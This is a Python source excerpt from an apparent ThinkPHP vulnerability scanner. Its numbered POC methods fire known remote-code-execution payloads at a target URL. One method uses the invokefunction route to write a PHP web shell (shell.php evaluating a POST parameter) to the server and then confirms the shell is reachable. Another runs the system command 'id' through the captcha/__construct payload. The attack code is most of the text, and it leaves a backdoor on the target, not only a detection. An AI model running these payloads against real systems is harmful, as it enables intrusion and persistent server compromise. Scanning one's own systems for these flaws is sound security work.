...
class ThinkRCEScan:
    ...
    def run28(self, urls):
        try:
            ...
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP 5.0.22_5.1.29漏洞 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                ...
                # pass
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP 5.0.22_5.1.29漏洞')

        except Exception:
            pass
    def run29(self, urls):
        try:
            url = urls + "index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3c%3fphp%20%40eval(%24_POST%5b'123'%5d)%3b%20%3f%3e"
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            url2 = urls + "/shell.php"
            response2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            if response2.status_code == 200 and response2.url == url2:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-Shell漏洞 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"Shell {url2}")
            else:
                # pass
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP漏洞')

        except Exception:
            pass
    def run30(self, urls):
        try:
            url = urls + '/index.php?s=captcha'
            data = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
            response = requests.post(url, headers=self.headers,data=data, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            if response.status_code == 200 and "uid=" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.23-RCE-POC ')
                OutPrintInfo("ThinkPHP", f"{url}")
            else:
                OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.23-RCE-POC')
    ...
    def main(self, target):
        ...
        self.run27(url)
        OutPrintInfo("ThinkPHP", '开始POC-27...')
        self.run28(url)
        OutPrintInfo("ThinkPHP", '开始POC-28...')
        self.run29(url)
        OutPrintInfo("ThinkPHP", '开始POC-29...')
        self.run30(url)
